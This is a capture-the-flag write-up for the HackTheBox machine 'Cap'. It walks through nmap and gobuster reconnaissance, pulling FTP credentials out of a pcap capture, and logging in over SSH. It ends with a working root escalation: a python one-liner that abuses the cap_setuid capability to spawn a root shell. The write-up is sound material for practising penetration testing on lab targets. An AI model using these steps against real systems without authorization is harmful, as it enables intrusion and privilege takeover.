Cap – Capture The Flag Writeup – HackTheBox

Overview

Cap is a vulnerable HackTheBox Machine that involves the user with pcap files, SSH, and an enumerable privesc technique.

User Flag

Nmap scan report for 10.129.205.117
Host is up (0.076s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
As there is an HTTP service running, I launch GoBuster to discover possible directories.

└─$ gobuster dir --url http://10.129.205.117 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Under the /capture URL, we see that there is a /1. If we download the file and open it in Wireshark, we can see the directory discovered traffic generated by GoBuster. The Dashboard suggests that these files are snapshots, so we try to look at the first file generated.

By studying the `0.pcap` file, we can see an FTP request with the user name and password in cleartext.

36  4.126500  192.168.196.1  192.168.196.16  FTP  69  Request: USER ****an
40  5.424998  192.168.196.1  192.168.196.16  FTP  78  Request: PASS *********RM3!
Using these credentials we can log into the FTP server and capture the user flag.

Root Flag

With the same credentials as the FTP server, we can log into the SSH service and start to privesc.

Initially, I tried to used sudo -l to see if there were any programs we could run as root, but we don’t have sudo permissions. After trying a few other techniques, such as inspecting the Crontab and searching for SUID bits, I launched LinPEAS. Unfortunately, I didn’t see anything that stood out, so I went searching for further manual privesc techniques.

Eventually, I stumbled on getcap and looked into the output. With getcap, we can examine file capabilities. Particularly, we can find binaries that may have unusual capabilities, such as universal read or write privileges.

user@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
The name of the box was a pretty big hint! Since python3.8 was set with setuid properties, we can run an inline python command to pop root.

/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
That’s it for this box! It’s a pretty easy box if you are familiar with the ideas already, but is great for beginners to practice.

If you’d like to see more writeups or browse knowledge articles for hackers, check out encryptech.net
